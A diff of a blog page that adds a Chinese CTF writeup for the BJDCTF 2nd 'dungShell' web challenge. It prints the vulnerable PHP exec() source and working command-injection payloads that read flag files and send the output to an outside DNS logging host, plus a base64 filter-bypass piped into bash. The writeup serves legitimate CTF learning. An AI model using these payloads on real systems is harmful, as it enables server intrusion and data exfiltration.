@@ -83,7 +83,7 @@
 <link href="/assets/css/main.css?v=5.1.1" rel="stylesheet" type="text/css" />
 
 
-  <meta name="keywords" content="Web," />
+  <meta name="keywords" content="CTF,Writeup," />
 
 
 
@@ -109,17 +109,17 @@
 
 
 
-<meta name="description" content="data php phar glob">
-<meta name="keywords" content="Web">
+<meta name="description" content="上周末BJD第二场，又是一届新生赛，尽管如此还是暴露出了很多问题。这段时间就先把这次总结出来的问题解决一下。">
+<meta name="keywords" content="CTF, Writeup">
 <meta property="og:type" content="article">
-<meta property="og:title" content="常见的协议">
-<meta property="og:url" content="http://localhost:4000/notes/2020/01/16/Common-Protocols/">
+<meta property="og:title" content="BJDCTF 2nd Web Writeup">
+<meta property="og:url" content="http://localhost:4000/writeups/2020/03/23/BJDCTF-2nd-Web-(copy)/">
 <meta property="og:site_name" content="Glyuan's Blog">
-<meta property="og:description" content="data php phar glob">
+<meta property="og:description" content="上周末BJD第二场，又是一届新生赛，尽管如此还是暴露出了很多问题。这段时间就先把这次总结出来的问题解决一下。">
 <meta property="og:locale" content="zh-Hans">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="常见的协议">
-<meta name="twitter:description" content="data php phar glob">
+<meta name="twitter:title" content="BJDCTF 2nd Web Writeup">
+<meta name="twitter:description" content="上周末BJD第二场，又是一届新生赛，尽管如此还是暴露出了很多问题。这段时间就先把这次总结出来的问题解决一下。">
 
 
 <script type="text/javascript" id="hexo.configurations">
@@ -152,7 +152,7 @@
 
 
 
-  <title>常见的协议 | Glyuan's Blog</title>
+  <title>BJDCTF 2nd Web Writeup | Glyuan's Blog</title>
   
 
 
@@ -302,7 +302,7 @@
   
 
   <article class="post post-type- " itemscope itemtype="http://schema.org/Article">
-    <link itemprop="mainEntityOfPage" href="http://localhost:4000/notes/2020/01/16/Common-Protocols/">
+    <link itemprop="mainEntityOfPage" href="http://localhost:4000/writeups/2020/03/23/BJDCTF-2nd-Web-(copy)/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="name" content="Asinose">
@@ -322,7 +322,7 @@
           <h1 class="post-title" itemprop="name headline">
           
           
-            常见的协议
+            BJDCTF 2nd Web Writeup
           
         </h1>
         
@@ -336,8 +336,8 @@
               
                 <span class="post-meta-item-text">发表于</span>
               
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-01-16T00:00:00+08:00">
-                2020-01-16
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-03-23T00:00:00+08:00">
+                2020-03-23
               </time>
             
 
@@ -360,8 +360,8 @@
               
                 
                 <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/category/#/Notes" itemprop="url" rel="index">
-                    <span itemprop="name">Notes</span>
+                  <a href="/category/#/Writeups" itemprop="url" rel="index">
+                    <span itemprop="name">Writeups</span>
                   </a>
                 </span>
 
@@ -415,14 +415,93 @@
 
 
 
-  <h1 id="data">data</h1>
+  <p>上周末BJD第二场，又是一届新生赛，尽管如此还是暴露出了很多问题。这段时间就先把这次总结出来的问题解决一下。</p>
 
-<h1 id="php">php</h1>
+<!-- more -->
 
-<h1 id="phar">phar</h1>
+<h1 id="dungshell">dungShell</h1>
 
-<h1 id="glob">glob</h1>
+<h2 id="题目描述">题目描述</h2>
 
+<p>提示写到脸上了，有.swp文件。</p>
+
+<h2 id="解题思路">解题思路</h2>
+
+<p>源码删减：</p>
+
+<figure class="highlight"><pre><code class="language-php" data-lang="php"><table class="rouge-table"><tbody><tr><td class="gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+</pre></td><td class="code"><pre><span class="cp">&lt;?php</span>
+<span class="nb">error_reporting</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
+<span class="k">echo</span> <span class="s2">"how can i give you source code? .swp?!"</span><span class="o">.</span><span class="s2">"&lt;br&gt;"</span><span class="p">;</span>
+<span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">'girl_friend'</span><span class="p">]))</span> <span class="p">{</span>
+    <span class="k">die</span><span class="p">(</span><span class="s2">"where is P3rh4ps's girl friend ???"</span><span class="p">);</span>
+<span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+    <span class="nv">$girl</span> <span class="o">=</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">'girl_friend'</span><span class="p">];</span>
+    <span class="k">if</span> <span class="p">(</span><span class="nb">preg_match</span><span class="p">(</span><span class="s1">'/\&gt;|\\\/'</span><span class="p">,</span> <span class="nv">$girl</span><span class="p">))</span> <span class="p">{</span>
+        <span class="k">die</span><span class="p">(</span><span class="s1">'just girl'</span><span class="p">);</span>
+    <span class="p">}</span> <span class="k">else</span> <span class="k">if</span> <span class="p">(</span><span class="nb">preg_match</span><span class="p">(</span><span class="s1">'/ls|phpinfo|cat|\%|\^|\~|base64|xxd|echo|\$/i'</span><span class="p">,</span> <span class="nv">$girl</span><span class="p">))</span> <span class="p">{</span>
+        <span class="k">echo</span> <span class="s2">"&lt;img src='img/p3_need_beautiful_gf.png'&gt; &lt;!-- He is p3 --&gt;"</span><span class="p">;</span>
+    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+        <span class="c1">//duangShell~~~~
+</span>        <span class="nb">exec</span><span class="p">(</span><span class="nv">$girl</span><span class="p">);</span>
+    <span class="p">}</span>
+<span class="p">}</span></pre></td></tr></tbody></table></code></pre></figure>
+
+<p>拦截形同虚设，可以用”php -r”执行PHP代码。不过没有回显，需要将结果打到DNS上。</p>
+
+<p>扫根目录：</p>
+
+<div class="highlighter-rouge"><div class="highlight"><table style="margin: 0px"><tbody><tr><td class="gutter"><pre>1</pre></td><td class="code"><pre class="highlight"><code>POST：girl_friend=php -r "system('ping '.substr(implode('.',scandir('/')),6,50).'.295af172a8d3ec4abf30.d.dns.requestbin.buuoj.cn');"
+</code></pre></td></tr></tbody></table></div></div>
+
+<p>读/flag：</p>
+
+<div class="highlighter-rouge"><div class="highlight"><table style="margin: 0px"><tbody><tr><td class="gutter"><pre>1</pre></td><td class="code"><pre class="highlight"><code>POST：girl_friend=php -r "system('ping '.substr(system('bas""e64 /flag'),0,50).'.295af172a8d3ec4abf30.d.dns.requestbin.buuoj.cn');"
+</code></pre></td></tr></tbody></table></div></div>
+
+<p>分两次读，解码后：</p>
+
+<div class="highlighter-rouge"><div class="highlight"><table style="margin: 0px"><tbody><tr><td class="gutter"><pre>1</pre></td><td class="code"><pre class="highlight"><code>flag{flag-is-not-here,please-find-it-by-yourself}
+</code></pre></td></tr></tbody></table></div></div>
+
+<p>不太对劲，要找真正的flag，在.bash_history里面看到了信息，然后再读：</p>
+
+<div class="highlighter-rouge"><div class="highlight"><table style="margin: 0px"><tbody><tr><td class="gutter"><pre>1</pre></td><td class="code"><pre class="highlight"><code>POST：girl_friend=php -r "system('ping '.substr(system('bas""e64 /etc/demo/P3rh4ps/love/flag'),0,50).'.46418d29ca743ab417af.d.dns.requestbin.buuoj.cn');"
+</code></pre></td></tr></tbody></table></div></div>
+
+<h2 id="备注">备注</h2>
+
+<ol>
+  <li>
+    <p>后来看题解，发现我好像非预期了，.bash_history是个意外，预期思路应该是用nc命令或者curl xxxx|bash弹Shell，然后find一下flag。</p>
+  </li>
+  <li>
+    <p>因为find命令会返回不止一行，而我的方法是利用了system()的返回，所以不太好用。当然也不是不可以，可以先将find的返回保存到变量foo中，然后echo一下${foo}。至于”$”符号的绕过，可以先将命令base64编码，传到服务器再解码，然后重定向到bash里，Payload大概长这样：</p>
+
+    <div class="highlighter-rouge"><div class="highlight"><table style="margin: 0px"><tbody><tr><td class="gutter"><pre>1<br/>2<br/>3</pre></td><td class="code"><pre class="highlight"><code> POST：girl_friend=php -r "system('ping '.substr(system('ec""ho YT0kKGZpbmQgLyAtbmFtZSBmbGFnKTtlY2hvICR7YToxMDoxNX18YmFzZTY0Cg==|ba""se64 -d|bash'),0,50).'.f9a0ea65a00ba5753d08.d.dns.requestbin.buuoj.cn');"
+    
+ YT0kKGZpbmQgLyAtbmFtZSBmbGFnKTtlY2hvICR7YToxMDoxNX18YmFzZTY0Cg== =&gt; a=$(find / -name flag);echo ${a:10:15}|base64
+</code></pre></td></tr></tbody></table></div>    </div>
+  </li>
+  <li>
+    <p>不得不说，上面这个方法太蛋疼了，得整一个VPS工具。</p>
+  </li>
+</ol>
 
 
       
@@ -454,7 +533,10 @@
         <div class="post-tags">
           
             
-            <a href="/tag/#/Web" rel="tag"># Web</a>
+            <a href="/tag/#/CTF" rel="tag"># CTF</a>
+          
+            
+            <a href="/tag/#/Writeup" rel="tag"># Writeup</a>
           
         </div>
       
@@ -470,8 +552,8 @@
         <div class="post-nav" id="post-nav-id">
           <div class="post-nav-next post-nav-item">
             
-              <a href="/writeups/2020/01/17/BJDCTF-Web/" rel="next" title="BJDCTF Web Writeup">
-                <i class="fa fa-chevron-left"></i> BJDCTF Web Writeup
+              <a href="/writeups/2020/03/23/BJDCTF-2nd-Web/" rel="next" title="BJDCTF 2nd Web Writeup">
+                <i class="fa fa-chevron-left"></i> BJDCTF 2nd Web Writeup
               </a>
             
           </div>
@@ -480,8 +562,8 @@
 
           <div class="post-nav-prev post-nav-item">
             
-              <a href="/notes/2020/01/15/grep_replace()-Code-Execution/" rel="prev" title="grep_replace()命令执行">
-                grep_replace()命令执行 <i class="fa fa-chevron-right"></i>
+              <a href="/notes/2020/03/14/PHP-VSCode-Xdebug/" rel="prev" title="使用VSCode+Xdebug">
+                使用VSCode+Xdebug <i class="fa fa-chevron-right"></i>
               </a>
             
           </div>
@@ -632,7 +714,7 @@
             
               <div class="post-toc-content">
     <ol class=nav>
-      <li class="nav-item nav-level-1"> <a class="nav-link" href="#data"> <span class="nav-number">1</span> <span class="nav-text">data</span> </a> </li> <li class="nav-item nav-level-1"> <a class="nav-link" href="#php"> <span class="nav-number">2</span> <span class="nav-text">php</span> </a> </li> <li class="nav-item nav-level-1"> <a class="nav-link" href="#phar"> <span class="nav-number">3</span> <span class="nav-text">phar</span> </a> </li> <li class="nav-item nav-level-1"> <a class="nav-link" href="#glob"> <span class="nav-number">4</span> <span class="nav-text">glob</span> </a> </li>
+      <li class="nav-item nav-level-1"> <a class="nav-link" href="#dungshell"> <span class="nav-number">1</span> <span class="nav-text">dungShell</span> </a> <ol class="nav-child"> <li class="nav-item nav-level-2"> <a class="nav-link" href="#题目描述"> <span class="nav-number">1.1</span> <span class="nav-text">题目描述</span> </a> </li> <li class="nav-item nav-level-2"> <a class="nav-link" href="#解题思路"> <span class="nav-number">1.2</span> <span class="nav-text">解题思路</span> </a> </li> <li class="nav-item nav-level-2"> <a class="nav-link" href="#备注"> <span class="nav-number">1.3</span> <span class="nav-text">备注</span> </a> </li> </ol> </li>
     </ol>
   </div>
             
